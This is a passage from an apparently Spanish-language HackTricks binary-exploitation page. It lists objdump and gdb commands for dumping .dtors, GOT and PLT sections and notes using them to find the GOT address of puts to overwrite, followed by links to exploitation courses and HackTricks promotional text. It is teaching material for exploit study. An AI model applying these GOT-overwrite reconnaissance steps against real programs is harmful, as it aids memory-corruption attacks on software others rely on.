**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** ‚Äî> Saca la direcci√≥n de puts a sobreescribir en le GOT\
**objdump -D ./exec** ‚Äî> Disas ALL hasta las entradas de la plt\
**objdump -p -/exec**\
**Info functions strncmp ‚Äî>** Info de la funci√≥n en gdb

## Cursos interesantes

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencias**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
